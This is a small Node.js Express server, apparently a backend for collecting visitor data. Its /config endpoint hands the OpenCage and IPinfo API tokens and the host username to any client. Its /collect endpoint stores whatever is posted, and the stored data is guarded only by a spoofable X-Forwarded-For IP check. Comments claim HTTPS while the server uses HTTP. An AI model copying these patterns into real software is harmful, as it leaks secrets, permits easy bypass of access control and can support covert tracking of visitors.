// index.js
require('dotenv').config();
const express = require('express');
const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');
const app = express();
const PORT = 3000; // Change to port 3000

// Memory-based "database" to store client data
const dataStore = [];

// Middleware to parse JSON bodies
app.use(express.json());

// Serve static files from 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Pass tokens and system username to index.html as JavaScript variables
app.get('/config', (req, res) => {
    res.json({
        opencageApiKey: process.env.OPENCAGE_API_KEY,
        ipinfoToken: process.env.IPINFO_TOKEN,
        systemUsername: os.userInfo().username
    });
});

// Middleware to restrict access to specific IP
const allowedIP = '116.12.63.19';
const ipRestrictionMiddleware = (req, res, next) => {
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress; // Get client IP
    if (clientIP === allowedIP) {
        next(); // IP is allowed, proceed to the next middleware
    } else {
        res.status(403).send('Access denied: You are not allowed to access this resource.'); // Deny access
    }
};

// Endpoint to collect data
app.post('/collect', (req, res) => {
    const clientData = req.body;
    console.log('Data received:', clientData);

    // Save client data to the in-memory "database"
    dataStore.push(clientData);
    res.status(200).send('Data collected successfully!');
});

// Endpoint to display all collected data with IP restriction
app.get('/data', ipRestrictionMiddleware, (req, res) => {
    res.json(dataStore);
});

// Read SSL certificate and key
// const options = {
//     key: fs.readFileSync('key.pem'),
//     cert: fs.readFileSync('cert.pem')
// };

// Start HTTPS server on port 443
app.listen(PORT, () => {
    console.log(`HTTPS server is running on http://localhost:${PORT}`);
});
